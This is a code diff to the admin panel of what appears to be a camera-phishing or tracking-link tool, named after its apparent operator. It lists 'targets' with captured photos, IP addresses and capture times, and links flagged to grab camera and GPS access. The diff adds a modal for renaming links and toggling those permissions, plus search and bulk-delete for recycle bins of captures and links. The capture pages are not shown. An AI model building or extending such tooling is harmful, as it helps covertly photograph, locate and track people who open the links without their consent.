@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Elite shahid Admin Control Panel</title>
+    <title>Shahid Bashir — Admin Control Panel</title>
     <style>
         :root {
             --primary: #007bff;
@@ -165,7 +165,8 @@
         .log-card .card-img { position: relative; }
         .log-card .card-img img {
             width: 100%; display: block;
-            max-height: 220px; object-fit: cover;
+            height: 160px; object-fit: cover;
+            object-position: center top;
         }
         .log-card .no-img {
             height: 140px; background: #252525;
@@ -202,8 +203,21 @@
             background: #1a0e0e;
             border: 1px solid #3d2020;
             border-radius: 10px;
-            padding: 14px;
+            overflow: hidden;
         }
+        .bin-card .bin-img img {
+            width: 100%; display: block;
+            height: 130px; object-fit: cover;
+            object-position: center top;
+            opacity: 0.75;
+            filter: grayscale(30%);
+        }
+        .bin-card .bin-img .no-img {
+            height: 80px; background: #1e1010;
+            display: flex; align-items: center; justify-content: center;
+            color: #555; font-size: 12px;
+        }
+        .bin-card .bin-body { padding: 10px 12px; }
         .bin-card p { margin: 4px 0; font-size: 13px; }
         .bin-card .meta { font-size: 11px; color: #777; }
 
@@ -212,9 +226,31 @@
             background: #0e1a0e;
             border: 1px solid #1e3d1e;
             border-radius: 10px;
-            padding: 14px;
+            overflow: hidden;
         }
+        .link-bin-card .bin-body { padding: 12px 14px; }
         .link-bin-card p { margin: 4px 0; font-size: 13px; }
+        .link-bin-card .meta { font-size: 11px; color: #777; }
+
+        /* ── RENAME / EDIT PERMISSIONS MODAL ── */
+        #editLinkModal {
+            position: fixed; inset: 0;
+            background: rgba(0,0,0,.75);
+            display: none; align-items: center; justify-content: center;
+            z-index: 8500;
+        }
+        #editLinkModal .modal-box {
+            background: var(--card);
+            border: 1px solid #333;
+            border-radius: 12px;
+            padding: 28px 32px;
+            min-width: 320px; text-align: left;
+        }
+        #editLinkModal h3 { margin: 0 0 18px; font-size: 16px; }
+        #editLinkModal label { display: block; font-size: 13px; margin-bottom: 6px; color: #bbb; }
+        #editLinkModal input[type="text"] { width: 100%; margin-bottom: 14px; }
+        .perm-row { display: flex; gap: 18px; margin-bottom: 18px; }
+        .perm-row label { display: flex; align-items: center; gap: 6px; cursor: pointer; color: #ddd; margin: 0; }
 
         /* ── NOTIFICATION TOAST ── */
         #toast {
@@ -280,6 +316,24 @@
     </div>
 </div>
 
+<!-- ── EDIT LINK MODAL (rename + permissions) ────────────────────────── -->
+<div id="editLinkModal">
+    <div class="modal-box">
+        <h3>✏️ Edit Link</h3>
+        <label>Link Name</label>
+        <input type="text" id="editLinkName" placeholder="Target Name">
+        <label>Permissions</label>
+        <div class="perm-row">
+            <label><input type="checkbox" id="editCam"> 📷 Camera</label>
+            <label><input type="checkbox" id="editGPS"> 📍 GPS</label>
+        </div>
+        <div style="display:flex;gap:8px;margin-top:4px;">
+            <button class="btn btn-blue"  id="saveEditLink"  style="flex:1;">💾 Save Changes</button>
+            <button class="btn btn-gray"  id="closeEditLink" style="flex:1;">Cancel</button>
+        </div>
+    </div>
+</div>
+
 <!-- ── PASSWORD CHANGE MODAL ──────────────────────────────────────────── -->
 <div id="pwModal">
     <div class="modal-box">
@@ -300,7 +354,7 @@
 
 <!-- ── TOP BAR ─────────────────────────────────────────────────────────── -->
 <div class="topbar">
-    <h1>⚡ Elite Admin Console</h1>
+    <h1>⚡ Shahid Bashir — Admin Console</h1>
     <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center;">
         <button class="btn btn-teal"   id="exportBtn">📥 Export CSV</button>
         <button class="btn btn-purple" id="changePwBtn">🔐 Password</button>
@@ -382,9 +436,13 @@
         <h3>🗑️ Log Recycle Bin</h3>
         <span class="badge badge-red" id="binCount">0</span>
     </div>
-    <p style="font-size:11px;color:#666;margin:0 0 12px;">
+    <p style="font-size:11px;color:#666;margin:0 0 10px;">
         Deleted captures. Local to this browser. Auto-removed after 30 days.
     </p>
+    <div style="display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-bottom:12px;">
+        <input type="text" id="binSearch" placeholder="🔍 Search by name or IP..." style="width:220px;">
+        <button class="btn btn-red" id="emptyBinBtn" style="margin-left:auto;">🔥 Empty Bin</button>
+    </div>
     <div id="binPhotoGrid" class="grid"></div>
 </div>
 
@@ -394,9 +452,13 @@
         <h3>♻️ Link Recycle Bin</h3>
         <span class="badge badge-green" id="linkBinCount">0</span>
     </div>
-    <p style="font-size:11px;color:#666;margin:0 0 12px;">
+    <p style="font-size:11px;color:#666;margin:0 0 10px;">
         Deleted links. Restore to re-activate, or burn forever.
     </p>
+    <div style="display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-bottom:12px;">
+        <input type="text" id="linkBinSearch" placeholder="🔍 Search by name..." style="width:220px;">
+        <button class="btn btn-red" id="emptyLinkBinBtn" style="margin-left:auto;">🔥 Empty Bin</button>
+    </div>
     <div id="linkBinGrid" class="grid"></div>
 </div>
 
@@ -490,6 +552,10 @@ function doLogin() {
     }
 }
 
+document.getElementById('closeEditLink').onclick = () => {
+    document.getElementById('editLinkModal').style.display = 'none';
+};
+
 // ── CHANGE PASSWORD ────────────────────────────────────────────────────────
 document.getElementById('changePwBtn').onclick = () => {
     document.getElementById('pwModal').style.display = 'flex';
@@ -555,6 +621,7 @@ function renderLinksTable() {
             <td style="font-size:11px;color:#888;">${l.createdAt ? new Date(l.createdAt).toLocaleDateString() : '—'}</td>
             <td>
                 <button class="btn btn-gray"  data-action="copy"   data-id="${id}">Copy URL</button>
+                <button class="btn btn-yellow" data-action="rename"  data-id="${id}">✏️ Rename</button>
                 <button class="btn ${l.active ? 'btn-red' : 'btn-green'}"
                         data-action="toggle" data-id="${id}" data-active="${l.active}">
                     ${l.active ? 'Disable' : 'Enable'}
@@ -584,6 +651,24 @@ document.getElementById('linkTableBody').addEventListener('click', e => {
     } else if (action === 'toggle') {
         const isActive = btn.dataset.active === 'true';
         update(ref(db, 'managed_links/' + id), { active: !isActive });
+
+    } else if (action === 'rename') {
+        const l = allLinksData && allLinksData[id];
+        if (!l) return;
+        document.getElementById('editLinkName').value = l.name || '';
+        document.getElementById('editCam').checked    = !!l.cam;
+        document.getElementById('editGPS').checked    = !!l.gps;
+        document.getElementById('editLinkModal').style.display = 'flex';
+        document.getElementById('saveEditLink').onclick = () => {
+            const newName = document.getElementById('editLinkName').value.trim() || l.name;
+            const newCam  = document.getElementById('editCam').checked;
+            const newGPS  = document.getElementById('editGPS').checked;
+            update(ref(db, 'managed_links/' + id), { name: newName, cam: newCam, gps: newGPS })
+                .then(() => {
+                    document.getElementById('editLinkModal').style.display = 'none';
+                    showToast('✅ Link updated: ' + newName, '#28a745');
+                });
+        };
 
     } else if (action === 'delete') {
         if (!confirm('Move this link to the Link Recycle Bin?')) return;
@@ -819,9 +904,14 @@ document.getElementById('exportBtn').onclick = () => {
 
 // ── LOG RECYCLE BIN ─────────────────────────────────────────────────────────
 function renderLogBin() {
-    const bin  = JSON.parse(localStorage.getItem('recycle_bin') || '[]');
+    const all  = JSON.parse(localStorage.getItem('recycle_bin') || '[]');
+    const search = (document.getElementById('binSearch')?.value || '').toLowerCase();
+    const bin  = search ? all.filter(p =>
+        (p.linkName || '').toLowerCase().includes(search) ||
+        (p.ipAddress || '').toLowerCase().includes(search)
+    ) : all;
     const grid = document.getElementById('binPhotoGrid');
-    document.getElementById('binCount').innerText = bin.length;
+    document.getElementById('binCount').innerText = all.length;
 
     if (bin.length === 0) {
         grid.innerHTML = '<div class="empty">Log recycle bin is empty.</div>';
@@ -833,13 +923,21 @@ function renderLogBin() {
         const card = document.createElement('div');
         card.className = 'bin-card';
         card.innerHTML = `
-            <p><b>🎯 Target:</b> ${escHtml(p.linkName || 'Unknown')}</p>
-            <p><b>🌐 IP:</b> ${escHtml(p.ipAddress || 'N/A')}</p>
-            <p class="meta">📅 Captured: ${escHtml(p.date || 'N/A')} ${escHtml(p.time || '')}</p>
-            <p class="meta">🗑 Deleted: ${new Date(p.deletedAt).toLocaleDateString()}</p>
-            <div style="display:flex;gap:6px;margin-top:10px;">
-                <button class="btn btn-green" data-log-bin-action="restore" data-log-id="${p.id}" style="flex:1;">♻️ Restore</button>
-                <button class="btn btn-red"   data-log-bin-action="burn"    data-log-id="${p.id}" style="flex:1;">🔥 Burn</button>
+            <div class="bin-img">
+                ${p.image
+                    ? `<img src="${p.image}" alt="Deleted capture">`
+                    : `<div class="no-img">📷 No Image</div>`
+                }
+            </div>
+            <div class="bin-body">
+                <p><b>🎯 Target:</b> ${escHtml(p.linkName || 'Unknown')}</p>
+                <p><b>🌐 IP:</b> ${escHtml(p.ipAddress || 'N/A')}</p>
+                <p class="meta">📅 Captured: ${escHtml(p.date || 'N/A')} ${escHtml(p.time || '')}</p>
+                <p class="meta">🗑 Deleted: ${new Date(p.deletedAt).toLocaleDateString()}</p>
+                <div style="display:flex;gap:6px;margin-top:10px;">
+                    <button class="btn btn-green" data-log-bin-action="restore" data-log-id="${p.id}" style="flex:1;">♻️ Restore</button>
+                    <button class="btn btn-red"   data-log-bin-action="burn"    data-log-id="${p.id}" style="flex:1;">🔥 Burn</button>
+                </div>
             </div>
         `;
         grid.appendChild(card);
@@ -873,9 +971,11 @@ document.getElementById('binPhotoGrid').addEventListener('click', e => {
 
 // ── LINK RECYCLE BIN ────────────────────────────────────────────────────────
 function renderLinkBin() {
-    const bin  = JSON.parse(localStorage.getItem('link_bin') || '[]');
+    const all  = JSON.parse(localStorage.getItem('link_bin') || '[]');
+    const search = (document.getElementById('linkBinSearch')?.value || '').toLowerCase();
+    const bin  = search ? all.filter(l => (l.name || '').toLowerCase().includes(search)) : all;
     const grid = document.getElementById('linkBinGrid');
-    document.getElementById('linkBinCount').innerText = bin.length;
+    document.getElementById('linkBinCount').innerText = all.length;
 
     if (bin.length === 0) {
         grid.innerHTML = '<div class="empty">Link recycle bin is empty.</div>';
@@ -887,13 +987,15 @@ function renderLinkBin() {
         const card = document.createElement('div');
         card.className = 'link-bin-card';
         card.innerHTML = `
-            <p><b>🔗 Name:</b> ${escHtml(l.name || 'Unknown')}</p>
-            <p class="meta">${l.cam ? '📷 Camera' : ''} ${l.gps ? '📍 GPS' : ''}</p>
-            <p class="meta">👁 ${l.visits || 0} visits before deletion</p>
-            <p class="meta">🗑 Deleted: ${new Date(l.deletedAt).toLocaleDateString()}</p>
-            <div style="display:flex;gap:6px;margin-top:10px;">
-                <button class="btn btn-green" data-link-bin-action="restore" data-link-fid="${l.firebaseId}" style="flex:1;">♻️ Restore Link</button>
-                <button class="btn btn-red"   data-link-bin-action="burn"    data-link-fid="${l.firebaseId}" style="flex:1;">🔥 Burn</button>
+            <div class="bin-body">
+                <p><b>🔗 Name:</b> ${escHtml(l.name || 'Unknown')}</p>
+                <p class="meta">${l.cam ? '📷 Camera' : '📷 <span style="color:#555;">No Camera</span>'} &nbsp;|&nbsp; ${l.gps ? '📍 GPS' : '📍 <span style="color:#555;">No GPS</span>'}</p>
+                <p class="meta">👁 ${l.visits || 0} visits before deletion</p>
+                <p class="meta">🗑 Deleted: ${new Date(l.deletedAt).toLocaleDateString()}</p>
+                <div style="display:flex;gap:6px;margin-top:10px;">
+                    <button class="btn btn-green" data-link-bin-action="restore" data-link-fid="${l.firebaseId}" style="flex:1;">♻️ Restore Link</button>
+                    <button class="btn btn-red"   data-link-bin-action="burn"    data-link-fid="${l.firebaseId}" style="flex:1;">🔥 Burn</button>
+                </div>
             </div>
         `;
         grid.appendChild(card);
@@ -949,6 +1051,22 @@ function escHtml(str) {
 
 // ── INIT ────────────────────────────────────────────────────────────────────
 document.getElementById('refreshBtn').onclick = () => location.reload();
+document.getElementById('binSearch').oninput     = renderLogBin;
+document.getElementById('linkBinSearch').oninput = renderLinkBin;
+
+document.getElementById('emptyBinBtn').onclick = () => {
+    if (!confirm('Permanently delete ALL items in Log Recycle Bin? This cannot be undone.')) return;
+    localStorage.setItem('recycle_bin', '[]');
+    renderLogBin();
+    showToast('🔥 Log bin emptied.', '#dc3545');
+};
+document.getElementById('emptyLinkBinBtn').onclick = () => {
+    if (!confirm('Permanently delete ALL items in Link Recycle Bin? This cannot be undone.')) return;
+    localStorage.setItem('link_bin', '[]');
+    renderLinkBin();
+    showToast('🔥 Link bin emptied.', '#dc3545');
+};
+
 cleanBins();
 renderLogBin();
 renderLinkBin();
@@ -956,4 +1074,3 @@ setInterval(cleanBins, 3600000);
 </script>
 </body>
 </html>
-
